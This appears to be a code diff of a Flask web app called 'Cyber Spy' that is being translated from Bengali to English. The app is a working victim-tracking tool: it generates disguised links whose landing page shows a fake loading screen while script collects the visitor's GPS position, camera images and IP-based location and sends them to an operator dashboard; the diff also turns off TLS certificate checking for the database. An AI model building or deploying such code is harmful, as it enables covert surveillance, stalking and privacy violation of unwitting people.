@@ -9,13 +9,18 @@ import uuid
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# ===== MongoDB সংযোগ (Render-এর পরিবেশ থেকে MONGO_URI নাও) =====
+# ===== MongoDB Connection =====
 MONGO_URI = os.environ.get('MONGO_URI')
 if not MONGO_URI:
-    raise Exception("MONGO_URI environment variable not set! Please add it in Render.")
+    raise Exception("MONGO_URI environment variable not set!")
 
 try:
-    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+    client = MongoClient(
+        MONGO_URI,
+        tls=True,
+        tlsAllowInvalidCertificates=True,
+        serverSelectionTimeoutMS=5000
+    )
     db = client['spy_db']
     users_col = db['users']
     client.admin.command('ping')
@@ -24,7 +29,6 @@ except Exception as e:
     print(f"❌ MongoDB connection error: {e}")
     raise
 
-# ===== বেস CSS (মোবাইল-ফ্রেন্ডলি) =====
 BASE_CSS = """
 <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
@@ -57,22 +61,21 @@ BASE_CSS = """
 </style>
 """
 
-# ===== লগইন পেজ =====
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লগইন</title>""" + BASE_CSS + """
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login</title>""" + BASE_CSS + """
 </head>
 <body>
 <div class="box">
     <h2>🕵️ Cyber Spy</h2>
     <div class="sub">Developer: Arif</div>
     <form method="POST">
-        <input type="text" name="username" placeholder="ইউজারনেম" required>
-        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
-        <button type="submit">লগইন</button>
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
     </form>
-    <a href="/register">নতুন ইউজার?</a>
+    <a href="/register">New user?</a>
     {% if error is defined and error %}
         <p class="error">{{ error }}</p>
     {% endif %}
@@ -81,22 +84,21 @@ LOGIN_HTML = """
 </html>
 """
 
-# ===== রেজিস্টার পেজ =====
 REGISTER_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>রেজিস্টার</title>""" + BASE_CSS + """
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Register</title>""" + BASE_CSS + """
 </head>
 <body>
 <div class="box">
-    <h2>🕵️ সাইন আপ</h2>
+    <h2>🕵️ Sign Up</h2>
     <div class="sub">Developer: Arif</div>
     <form method="POST">
-        <input type="text" name="username" placeholder="ইউজারনেম" required>
-        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
-        <button type="submit">রেজিস্টার</button>
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Register</button>
     </form>
-    <a href="/login">ইতিমধ্যে আছে?</a>
+    <a href="/login">Already have an account?</a>
     {% if error is defined and error %}
         <p class="error">{{ error }}</p>
     {% endif %}
@@ -105,37 +107,36 @@ REGISTER_HTML = """
 </html>
 """
 
-# ===== ড্যাশবোর্ড =====
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ড্যাশবোর্ড</title>""" + BASE_CSS + """
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Dashboard</title>""" + BASE_CSS + """
 </head>
 <body>
 <div class="container">
     <h1 style="text-align:center;color:#ff0044;">🕵️ Cyber Spy</h1>
     <div class="brand">Developer: Arif</div>
     <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
-        <span style="color:#6688aa;">স্বাগতম, {{ user.username }}</span>
-        <a href="/logout" class="logout">🚪 লগআউট</a>
+        <span style="color:#6688aa;">Welcome, {{ user.username }}</span>
+        <a href="/logout" class="logout">🚪 Logout</a>
     </div>
     <div class="card">
-        <h3>📎 নতুন লিংক তৈরি</h3>
+        <h3>📎 Create New Link</h3>
         <form method="POST" action="/create_link">
-            <input type="text" name="link_name" placeholder="লিংকের নাম (যেমন: ফেসবুক টুল)" required>
-            <button type="submit">🔗 জেনারেট</button>
+            <input type="text" name="link_name" placeholder="Link name (e.g., Facebook Tool)" required>
+            <button type="submit">🔗 Generate</button>
         </form>
     </div>
     <div class="card">
-        <h3>📌 আপনার লিংকসমূহ</h3>
+        <h3>📌 Your Links</h3>
         {% for link in user.links %}
         <div style="background:#0d1520;padding:15px;border-radius:12px;margin:10px 0;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;">
             <span><strong>{{ link.name }}</strong><br><a href="{{ link.url }}" target="_blank" style="color:#00ffcc;word-break:break-all;">{{ link.url }}</a></span>
             <span>👁️ {{ link.visits|length }}</span>
-            <a href="/view_link/{{ link.id }}" style="color:#ff0044;">📊 দেখুন</a>
+            <a href="/view_link/{{ link.id }}" style="color:#ff0044;">📊 View</a>
         </div>
         {% else %}
-        <p style="color:#6688aa;">কোনো লিংক তৈরি করেননি।</p>
+        <p style="color:#6688aa;">You haven't created any links.</p>
         {% endfor %}
     </div>
 </div>
@@ -143,29 +144,28 @@ DASHBOARD_HTML = """
 </html>
 """
 
-# ===== ভিজিটর ডেটা দেখার পেজ =====
 VIEW_LINK_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ভিজিটর ডেটা</title>""" + BASE_CSS + """
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
 </head>
 <body>
 <div class="container">
-    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ ড্যাশবোর্ডে ফিরুন</a>
+    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ Back to Dashboard</a>
     <h1 style="text-align:center;color:#ff0044;">📊 {{ link.name }}</h1>
-    <p style="color:#6688aa;">মোট ভিজিট: {{ link.visits|length }}</p>
+    <p style="color:#6688aa;">Total Visits: {{ link.visits|length }}</p>
     <div style="overflow-x:auto;">
     <table>
-        <tr><th>#</th><th>IP</th><th>লোকেশন</th><th>GPS</th><th>ব্রাউজার</th><th>ক্যামেরা</th><th>স্ক্রিনশট</th><th>সময়</th><th>অ্যাকশন</th></tr>
+        <tr><th>#</th><th>IP</th><th>Location</th><th>GPS</th><th>Browser</th><th>Camera</th><th>Screenshot</th><th>Time</th><th>Action</th></tr>
         {% for v in link.visits %}
         <tr>
             <td>{{ loop.index }}</td>
             <td>{{ v.ip }}</td>
             <td>{{ v.city }}, {{ v.country }}</td>
-            <td>{{ v.gps or 'নেই' }}</td>
+            <td>{{ v.gps or 'N/A' }}</td>
             <td>{{ v.user_agent[:25] }}..</td>
-            <td>{% if v.camera %}<img src="{{ v.camera }}" />{% else %}নেই{% endif %}</td>
-            <td>{% if v.screenshot %}<img src="{{ v.screenshot }}" />{% else %}নেই{% endif %}</td>
+            <td>{% if v.camera %}<img src="{{ v.camera }}" />{% else %}N/A{% endif %}</td>
+            <td>{% if v.screenshot %}<img src="{{ v.screenshot }}" />{% else %}N/A{% endif %}</td>
             <td>{{ v.time }}</td>
             <td><a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️</a></td>
         </tr>
@@ -177,11 +177,10 @@ VIEW_LINK_HTML = """
 </html>
 """
 
-# ===== ডেটা কালেক্টর পেজ (ভিকটিম দেখবে) =====
 COLLECTOR_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লোড হচ্ছে</title>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading...</title>
 <style>
 body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px;text-align:center}
 .loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:20px}
@@ -191,13 +190,13 @@ p{font-size:1.2rem;color:#6688aa}
 </head>
 <body>
     <div class="loader"></div>
-    <p>⏳ সংযোগ স্থাপন...</p>
+    <p>⏳ Establishing connection...</p>
     <script>
-        let gps = 'অনুমতি নেই';
+        let gps = 'Permission denied';
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => { gps = pos.coords.latitude + ',' + pos.coords.longitude; },
-                () => { gps = 'ব্যর্থ'; }
+                () => { gps = 'Failed'; }
             );
         }
         let camera = null;
@@ -215,7 +214,7 @@ p{font-size:1.2rem;color:#6688aa}
                     sendData();
                 }, 2000);
             })
-            .catch(() => { camera = 'ব্যর্থ'; sendData(); });
+            .catch(() => { camera = 'Failed'; sendData(); });
 
         function captureScreen() {
             const canvas = document.createElement('canvas');
@@ -226,7 +225,7 @@ p{font-size:1.2rem;color:#6688aa}
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = '#00ffcc';
             ctx.font = '20px monospace';
-            ctx.fillText('সিকিউর স্ক্রিন', 20, 50);
+            ctx.fillText('Secure Screen', 20, 50);
             return canvas.toDataURL('image/png');
         }
 
@@ -255,7 +254,7 @@ p{font-size:1.2rem;color:#6688aa}
 </html>
 """
 
-# ===== হেল্পার ফাংশন =====
+# ===== Helper Functions =====
 def get_user(username):
     return users_col.find_one({'username': username})
 
@@ -269,7 +268,7 @@ def create_user(username, password):
     users_col.insert_one(user)
     return user
 
-# ===== রাউট =====
+# ===== Routes =====
 @app.route('/')
 def home():
     return redirect(url_for('login'))
@@ -281,14 +280,14 @@ def login():
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '').strip()
         if not username or not password:
-            error = 'ইউজারনেম ও পাসওয়ার্ড দিন'
+            error = 'Please enter username and password'
         else:
             user = get_user(username)
             if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
                 session['user'] = username
                 return redirect(url_for('dashboard'))
             else:
-                error = 'ভুল ক্রেডেনশিয়াল'
+                error = 'Invalid credentials'
     return render_template_string(LOGIN_HTML, error=error)
 
 @app.route('/register', methods=['GET', 'POST'])
@@ -298,9 +297,9 @@ def register():
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '').strip()
         if not username or not password:
-            error = 'সব ফিল্ড পূরণ করুন'
+            error = 'All fields required'
         elif get_user(username):
-            error = 'ইউজারনেম নেওয়া হয়েছে'
+            error = 'Username already taken'
         else:
             create_user(username, password)
             return redirect(url_for('login'))
@@ -338,11 +337,11 @@ def collector_page(link_id):
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     try:
         loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
-        city = loc.get('city', 'অজানা')
-        country = loc.get('country', 'অজানা')
+        city = loc.get('city', 'Unknown')
+        country = loc.get('country', 'Unknown')
     except:
-        city = 'অজানা'
-        country = 'অজানা'
+        city = 'Unknown'
+        country = 'Unknown'
     return render_template_string(COLLECTOR_HTML, ip=ip, link_id=link_id)
 
 @app.route('/collect/<link_id>', methods=['POST'])
@@ -355,14 +354,14 @@ def collect_data(link_id):
     if ip:
         try:
             loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
-            data['city'] = loc.get('city', 'অজানা')
-            data['country'] = loc.get('country', 'অজানা')
+            data['city'] = loc.get('city', 'Unknown')
+            data['country'] = loc.get('country', 'Unknown')
         except:
-            data['city'] = 'অজানা'
-            data['country'] = 'অজানা'
+            data['city'] = 'Unknown'
+            data['country'] = 'Unknown'
     else:
-        data['city'] = 'অজানা'
-        data['country'] = 'অজানা'
+        data['city'] = 'Unknown'
+        data['country'] = 'Unknown'
     result = users_col.update_one(
         {'links.id': link_id},
         {'$push': {'links.$.visits': data}}
@@ -385,7 +384,7 @@ def view_link(link_id):
             link = l
             break
     if not link:
-        return 'লিংক পাওয়া যায়নি', 404
+        return 'Link not found', 404
     return render_template_string(VIEW_LINK_HTML, link=link)
 
 @app.route('/delete_visit/<link_id>/<int:index>')
